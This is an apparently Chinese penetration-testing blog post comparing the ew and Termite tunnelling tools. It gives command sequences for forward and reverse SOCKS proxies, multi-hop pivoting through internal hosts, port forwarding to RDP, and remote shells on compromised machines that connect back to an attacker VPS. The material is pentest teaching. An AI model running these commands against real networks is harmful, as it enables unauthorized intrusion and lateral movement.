Title: Termite代理工具
Category: Pentest
Date: 2018-2-3
slug: termite

网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的

正向socks v5服务器

<https://xianzhi.aliyun.com/forum/read/735.html>
以上面这个文章作为例子，来说下对应的转发与代理

如果目标有一个外网IP：

ew来说建立socks代理服务：

`ew -s ssocksd -l 8888`

Termite:

```
agent_exe -l 8888
admin_exe -c [tartet_ip] -p 8888
然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
goto 1
socks 1080
此时VPS上面的1080就架设了一个服务器。
```

## 反弹socks服务器

假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：

```
VPS： ew -s rcsocks -l 1080 -e 888
Target: ew -s rssocks -d 139.x.x.113 -e 888
此时就可以以vps上面1080端口作为代理进入内网
```

Termite:

```
VPS:  ./agent_exe -l 888
Target: ./agent_exe -c [139.x.x.113] -p 888
VPS: ./admin_exe -c 127.0.0.1 -p 888
此时获取一个admin的终端，然后查看节点，target会变成2节点，
goto 2
socks 1080  //现在可以以vps上面1080作为代理进入目标内网
shell 6666  //在vps上面直接nc 127.0.0.1 6666可以获取目标主机的shell
downfile和upfile  //可以直接下载上传文件
```

### 二级网络环境(一)

<https://xianzhi.aliyun.com/forum/read/735.html> 

这个环境稍微复杂一点，大家可以看着图

```
分为4个步骤：

VPS: ew -s lcx_listen -l 10800 -e 888  //在vps上面添加转接隧道，把10800端口收到的代理请求转发给888

B: ew -s ssocksd -l 999   //B主机启动socks代理，端口999

A: ew -s lcx_slave -d 139.x.x.113 -e 888 -f 10.48.128.49 -g 999 //在A主机上面使用lcx_slave的方式，把公网的888端口和B主机的999端口连接起来

现在可以通过vps的10800来使用B主机架设的socks5代理

```

Termite是这样:

```
VPS: ./agent_exe -l 888
A主机: ./agent_exe -c [139.x.x.113] -p 888
VPS: ./admin_exe -c 127.0.0.1 -p 888
goto 2
listen 999
B主机: ./agent_exe -c 10.48.128.49 -p 999
此时B主机节点是3
goto 3 
socks 10800

此时就可以以VPS上面的10800作为socks代理，进入B的内网。
```

从上面的操作可以看出来Termite只要把agent节点互相连接起来，就可以在admin里面跳来跳去，跳到哪里就可以以那个节点作为socks代理，或者端口转发，或者把那个节点开一个shell。

比如上面在B主机开一个shell:

```
goto 3
shell 7777
然后在vps上面 nc 127.0.0.1 7777就获得B主机的shell
```

一句话: 只要agent节点之间互联，admin就可以随便跳

### 三级网络环境:

ew是这样操作的:

```
VPS: ew -s rcsoskc -l 1080 -e 888
A: ew -s lcx_slave -d 139.x.x.113 -e 888 -f 10.48.128.12 -g 999
B: ew -s lcx_listen -l 999 -e 777
C: ew -s rssocks -d 10.48.128.12 -e 777

此时就可以通过VPS上面的139.x.x.113的1080端口来使用在C主机架设的socks5代理
```

Termite:

```
VPS: ./agent_exe -l 888
A主机: ./agent_exe -c [139.x.x.113] -p 888
VPS: ./admin_exe -c 127.0.0.1 -p 888
B: ./agent_exe -l 999  //B主机开启一个监听
goto 2 //跳转到A节点
connect 10.48.128.12  999 //连接到B主机

C: ./agent_exe -l 777
goto 3  //跳转到B主机节点
connect 192.168.0.10 777  //在B节点连接C主机

或者在C节点直接连接B:

goto 3 //跳到B
listen 666
C: ./agent_exe -c 10.48.128.12 666

```


上面的连接方式可能会存在错误的地方，请指正 ＝。＝  另外各位大佬在使用过程中有啥问题，也丢出来一起讨论下呗

注意的点：

* shell指令在使用nc连接过去之后，如果10s内没操作会自动断开，这个作者在视频里说过了，大家如果有需求可以发邮件给作者
* lcxtran这个忘了说了，这个跟上面指令差不多，是一个端口转发。比如在B节点lcxtran 10000 C的IP 3389，此时连接vps上面的10000就可以连接C的3389啦

参考资料:

* <http://rootkiter.com/Termite/README.txt>
* <https://xianzhi.aliyun.com/forum/read/735.html>